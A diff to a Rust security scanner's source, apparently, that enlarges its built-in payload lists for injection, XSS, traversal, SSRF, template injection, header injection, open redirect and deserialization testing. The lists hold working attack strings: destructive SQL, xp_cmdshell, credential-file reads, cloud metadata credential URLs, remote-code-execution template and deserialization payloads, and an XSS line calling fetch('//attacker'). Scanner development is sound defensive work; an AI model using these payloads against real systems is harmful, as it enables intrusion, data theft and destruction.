@@ -389,66 +389,177 @@ fn build_default_templates() -> Vec<(VulnerabilityClass, Vec<String>)> {
         (
             VulnerabilityClass::SqlInjection,
             vec![
+                // Classic tautology
                 "' OR '1'='1".to_string(),
                 "' OR '1'='1' --".to_string(),
+                "' OR ''='".to_string(),
+                "\" OR \"\"=\"".to_string(),
+                // Destructive / stacked queries
                 "'; DROP TABLE users; --".to_string(),
+                "1; EXEC xp_cmdshell('id')--".to_string(),
+                "'; WAITFOR DELAY '0:0:5'; --".to_string(),
+                // UNION-based
                 "1 UNION SELECT null,null,null--".to_string(),
+                "-1 UNION SELECT username,password FROM users--".to_string(),
+                "' UNION SELECT NULL,table_name FROM information_schema.tables--".to_string(),
+                "1 UNION ALL SELECT NULL,NULL,NULL,NULL--".to_string(),
+                // Boolean blind
                 "' AND 1=1--".to_string(),
+                "' AND 1=2--".to_string(),
+                "' AND substring(version(),1,1)='5'--".to_string(),
+                // Order-by probing
                 "1' ORDER BY 1--".to_string(),
+                "1' ORDER BY 100--".to_string(),
+                // Time-based blind (MySQL)
                 "' WAITFOR DELAY '0:0:5'--".to_string(),
+                "1' AND (SELECT SLEEP(5))--".to_string(),
+                "1' AND BENCHMARK(10000000,SHA1('test'))--".to_string(),
+                // Time-based blind (PostgreSQL)
                 "1; SELECT pg_sleep(5)--".to_string(),
+                "' OR pg_sleep(5)::text='1'--".to_string(),
+                // Error-based (MySQL)
+                "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--".to_string(),
+                // Error-based (MSSQL)
+                "1 AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--".to_string(),
+                // SQLite specific
+                "' AND 1=randomblob(100000000)--".to_string(),
             ],
         ),
         (
             VulnerabilityClass::CrossSiteScripting,
             vec![
+                // Classic reflected
                 "<script>alert(1)</script>".to_string(),
                 "<img src=x onerror=alert(1)>".to_string(),
                 "<svg onload=alert(1)>".to_string(),
                 "javascript:alert(1)".to_string(),
                 "'\"><script>alert(1)</script>".to_string(),
                 "<body onload=alert(1)>".to_string(),
+                // Event handler variants
+                "<details open ontoggle=alert(1)>".to_string(),
+                "<input onfocus=alert(1) autofocus>".to_string(),
+                "<marquee onstart=alert(1)>".to_string(),
+                "<video src=x onerror=alert(1)>".to_string(),
+                // DOM / mutation XSS
+                "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>".to_string(),
+                "<iframe srcdoc='<script>alert(1)</script>'>".to_string(),
+                "<svg><animate onbegin=alert(1) attributeName=x>".to_string(),
+                // Attribute injection / breakout
+                "\"><svg/onload=fetch('//attacker')>".to_string(),
+                "'-alert(1)-'".to_string(),
+                "\" onmouseover=\"alert(1)".to_string(),
+                // Template literal / polyglot
+                "${alert(1)}".to_string(),
+                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//".to_string(),
             ],
         ),
         (
             VulnerabilityClass::CommandInjection,
             vec![
+                // Unix shell metacharacters
                 "; id".to_string(),
                 "| id".to_string(),
                 "$(id)".to_string(),
                 "`id`".to_string(),
                 "; cat /etc/passwd".to_string(),
                 "& whoami".to_string(),
+                // Time-based / out-of-band
+                "$(sleep 5)".to_string(),
+                "| sleep 5 #".to_string(),
+                ";ping -c 5 127.0.0.1".to_string(),
+                "`sleep 5`".to_string(),
+                // Newline injection
+                "\nid\n".to_string(),
+                "\r\nid\r\n".to_string(),
+                // Shell globbing / bracket
+                "a]b[$(id)".to_string(),
+                "$(cat</etc/passwd)".to_string(),
+                // Windows variants
+                "& dir C:\\".to_string(),
+                "| type C:\\Windows\\win.ini".to_string(),
+                // Encoding bypass
+                ";{id}".to_string(),
+                "|| id".to_string(),
             ],
         ),
         (
             VulnerabilityClass::PathTraversal,
             vec![
+                // Basic Unix
                 "../../../etc/passwd".to_string(),
+                "../../../../etc/shadow".to_string(),
+                "../../../etc/hosts".to_string(),
+                // Basic Windows
                 "..\\..\\..\\windows\\system32\\config\\sam".to_string(),
+                "..\\..\\..\\windows\\win.ini".to_string(),
+                // Collapsed-slash bypass
                 "....//....//....//etc/passwd".to_string(),
+                "....\\\\....\\\\....\\\\etc/passwd".to_string(),
+                // URL-encoded
                 "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd".to_string(),
+                "/%2e%2e/%2e%2e/%2e%2e/etc/passwd".to_string(),
+                // Double-encoded
+                "..%252f..%252f..%252fetc/passwd".to_string(),
+                "..%252e%252e%252fetc/passwd".to_string(),
+                // Overlong UTF-8
+                "..%c0%afetc/passwd".to_string(),
+                "..%ef%bc%8fetc/passwd".to_string(),
+                // Null byte truncation
                 "/etc/passwd%00".to_string(),
+                "/etc/passwd%00.png".to_string(),
             ],
         ),
         (
             VulnerabilityClass::ServerSideRequestForgery,
             vec![
+                // Standard loopback
                 "http://127.0.0.1".to_string(),
                 "http://localhost".to_string(),
                 "http://0.0.0.0".to_string(),
                 "http://[::1]".to_string(),
+                // Cloud metadata
                 "http://169.254.169.254/latest/meta-data/".to_string(),
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/".to_string(),
+                // Alternative IP representations
+                "http://0x7f000001".to_string(),
+                "http://2130706433".to_string(),
+                "http://017700000001".to_string(),
+                "http://127.1".to_string(),
+                // Internal service ports
+                "http://127.0.0.1:6379".to_string(),
+                "http://127.0.0.1:11211".to_string(),
+                // DNS rebinding / domain confusion
+                "http://localtest.me".to_string(),
+                "http://127.0.0.1.nip.io".to_string(),
+                // Protocol smuggling
+                "gopher://127.0.0.1:25/".to_string(),
             ],
         ),
         (
             VulnerabilityClass::ServerSideTemplateInjection,
             vec![
+                // Detection probes
                 "{{7*7}}".to_string(),
                 "${7*7}".to_string(),
                 "<%= 7*7 %>".to_string(),
                 "#{7*7}".to_string(),
                 "{{config}}".to_string(),
+                // Jinja2 / Python
+                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}".to_string(),
+                "{{''.__class__.__mro__[1].__subclasses__()}}".to_string(),
+                "{% for x in ().__class__.__base__.__subclasses__() %}{{x.__name__}}{% endfor %}".to_string(),
+                // Spring / Java EL
+                "#{T(java.lang.Runtime).getRuntime().exec('id')}".to_string(),
+                "${T(java.lang.Runtime).getRuntime().exec('id')}".to_string(),
+                // Freemarker
+                "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex('id')}".to_string(),
+                // Velocity
+                "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))".to_string(),
+                // Twig
+                "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}".to_string(),
+                // ERB / Ruby
+                "<%= system('id') %>".to_string(),
+                "<%= `id` %>".to_string(),
             ],
         ),
         (
@@ -456,15 +567,34 @@ fn build_default_templates() -> Vec<(VulnerabilityClass, Vec<String>)> {
             vec![
                 "value\r\nInjected-Header: true".to_string(),
                 "value\nX-Injected: yes".to_string(),
+                "value\r\nSet-Cookie: session=hijacked".to_string(),
+                "value\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK".to_string(),
+                "value%0d%0aX-Injected: yes".to_string(),
+                "value\r\nX-Forwarded-For: 127.0.0.1".to_string(),
             ],
         ),
         (
             VulnerabilityClass::OpenRedirect,
             vec![
+                // Protocol-relative
                 "//evil.com".to_string(),
-                "https://evil.com".to_string(),
-                "/\\evil.com".to_string(),
                 "//evil.com/%2f..".to_string(),
+                // Absolute URL
+                "https://evil.com".to_string(),
+                "http://evil.com".to_string(),
+                // Backslash confusion
+                "/\\evil.com".to_string(),
+                "\\\\evil.com".to_string(),
+                // URL encoding tricks
+                "/%09/evil.com".to_string(),
+                "//%0d%0aevil.com".to_string(),
+                // At-sign confusion
+                "http://trusted.com@evil.com".to_string(),
+                // Data URI
+                "data:text/html,<script>alert(1)</script>".to_string(),
+                // Whitespace prefix
+                " https://evil.com".to_string(),
+                "\thttps://evil.com".to_string(),
             ],
         ),
         (
@@ -472,14 +602,33 @@ fn build_default_templates() -> Vec<(VulnerabilityClass, Vec<String>)> {
             vec![
                 "%0d%0aSet-Cookie:evil=true".to_string(),
                 "\r\nLocation: http://evil.com".to_string(),
+                "%0aSet-Cookie:evil=true".to_string(),
+                "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>".to_string(),
+                "\r\nX-Injected: true".to_string(),
+                "%0d%0aX-Forwarded-For: 127.0.0.1".to_string(),
             ],
         ),
         (
             VulnerabilityClass::InsecureDeserialization,
             vec![
+                // Java serialized object (base64 prefix)
                 "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==".to_string(),
+                // PHP object injection
                 "O:8:\"stdClass\":0:{}".to_string(),
+                // .NET type confusion
                 "{\"__type\":\"System.Windows.Data.ObjectDataProvider\"}".to_string(),
+                // Node.js node-serialize RCE
+                "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}".to_string(),
+                // Python pickle (cos\nsystem)
+                "cos\nsystem\n(S'id'\ntR.".to_string(),
+                // Python yaml.load (PyYAML < 6.0)
+                "!!python/object/apply:os.system ['id']".to_string(),
+                // PHP phar deserialization trigger
+                "phar://./uploads/evil.phar/test".to_string(),
+                // Ruby Marshal
+                "BAhJIgpIZWxsbwY6BkVU".to_string(),
+                // Java (ysoserial CommonsBeanutils1 marker)
+                "aced0005737200176f72672e6170616368652e636f6d6d6f6e73".to_string(),
             ],
         ),
     ]
